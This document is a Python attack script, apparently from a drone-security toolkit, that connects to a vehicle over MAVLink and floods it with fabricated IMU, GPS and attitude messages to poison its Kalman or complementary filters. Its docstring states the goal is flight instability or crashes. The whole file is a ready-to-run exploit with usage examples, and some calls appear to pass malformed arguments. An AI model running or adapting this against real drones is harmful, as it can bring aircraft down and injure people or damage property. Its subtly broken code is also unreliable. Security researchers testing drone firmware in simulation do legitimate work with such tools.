#!/usr/bin/env python3
"""
Sensor Fusion Poisoning
Poison sensor fusion algorithms to cause incorrect state estimation

Exploits sensor fusion algorithms (like Extended Kalman Filter) to
cause incorrect state estimation, leading to flight instability or crashes.

CVSS Score: 6.5 (Medium)
Affected: Drones with sensor fusion systems (EKF, complementary filters)
"""

import sys
import time
from pymavlink import mavutil

def poison_sensor_fusion(connection_string, fusion_type='ekf'):
    """
    Poison sensor fusion algorithm
    
    Args:
        connection_string: MAVLink connection string
        fusion_type: Type of fusion ('ekf', 'complementary', 'kalman')
    """
    try:
        print("[*] Sensor Fusion Poisoning Attack")
        print(f"[*] Fusion type: {fusion_type}")
        print(f"[*] Connecting to {connection_string}...")
        
        # Use helper function for connection
        import sys
        from pathlib import Path
        sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
        from mavlink_helper import connect_to_drone
        
        master = connect_to_drone(connection_string, timeout=5)
        if master is None:
            return False
        print("[+] Connected to vehicle")
        
        target_system = master.target_system
        target_component = master.target_component
        
        print("[*] Poisoning sensor fusion algorithm...")
        
        if fusion_type == 'ekf':
            poison_ekf(master, target_system, target_component)
        elif fusion_type == 'complementary':
            poison_complementary_filter(master, target_system, target_component)
        elif fusion_type == 'kalman':
            poison_kalman_filter(master, target_system, target_component)
        else:
            print(f"[-] Unknown fusion type: {fusion_type}")
            return False
        
        print("[+] Sensor fusion poisoning completed")
        return True
        
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        return False

def poison_ekf(master, target_system, target_component):
    """Poison Extended Kalman Filter"""
    print("[*] Poisoning Extended Kalman Filter (EKF)...")
    
    # Inject conflicting sensor data to confuse EKF
    print("[*] Injecting conflicting IMU, GPS, and magnetometer data...")
    
    for i in range(50):
        # Conflicting IMU data
        master.mav.raw_imu_send(
            0,
            1000 + (i * 100),  # X accel (conflicting)
            -1000 - (i * 100),  # Y accel (conflicting)
            500 + (i * 50),  # Z accel (conflicting)
            100 + (i * 10),  # X gyro
            -100 - (i * 10),  # Y gyro
            50 + (i * 5),  # Z gyro
            100,  # X mag
            200,  # Y mag
            300   # Z mag
        )
        
        # Conflicting GPS data
        master.mav.gps_raw_int_send(
            0,
            3,  # Fix type
            int((37.7749 + (i * 0.0001)) * 1e7),
            int((-122.4194 - (i * 0.0001)) * 1e7),
            100000 + (i * 1000),
            65535, 65535, 65535, 65535, 65535, 65535
        )
        
        time.sleep(0.1)
    
    print("[+] EKF poisoning attempted")

def poison_complementary_filter(master, target_system, target_component):
    """Poison complementary filter"""
    print("[*] Poisoning complementary filter...")
    
    # Inject rapid sensor changes to overwhelm filter
    for i in range(40):
        master.mav.attitude_send(
            0,
            (i % 10) * 0.5,  # Rapid roll changes
            (i % 10) * 0.5,  # Rapid pitch changes
            (i % 10) * 0.5,  # Rapid yaw changes
            10.0, 10.0, 10.0  # High rotation rates
        )
        time.sleep(0.1)
    print("[+] Complementary filter poisoning attempted")

def poison_kalman_filter(master, target_system, target_component):
    """Poison Kalman filter"""
    print("[*] Poisoning Kalman filter...")
    
    # Inject sensor data with incorrect covariance
    for i in range(30):
        # Send data that violates Kalman filter assumptions
        master.mav.raw_imu_send(
            0,
            i * 1000,  # Increasing acceleration (unrealistic)
            -i * 1000,  # Decreasing acceleration (conflicting)
            i * 500,  # Z acceleration
            0, 0, 0, 0, 0, 0
        )
        time.sleep(0.1)
    print("[+] Kalman filter poisoning attempted")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 sensor_fusion_poisoning.py <connection> [fusion_type]")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  fusion_type   Type: ekf, complementary, kalman (default: ekf)")
        print("\nExamples:")
        print("  python3 sensor_fusion_poisoning.py udp:127.0.0.1:14550")
        print("  python3 sensor_fusion_poisoning.py udp:127.0.0.1:14550 kalman")
        print("\nSensor Fusion Poisoning")
        print("CVSS Score: 6.5 (Medium)")
        print("Affected: Drones with sensor fusion systems")
        sys.exit(1)
    
    connection = sys.argv[1]
    fusion_type = sys.argv[2] if len(sys.argv) > 2 else 'ekf'
    
    poison_sensor_fusion(connection, fusion_type)

if __name__ == "__main__":
    main()
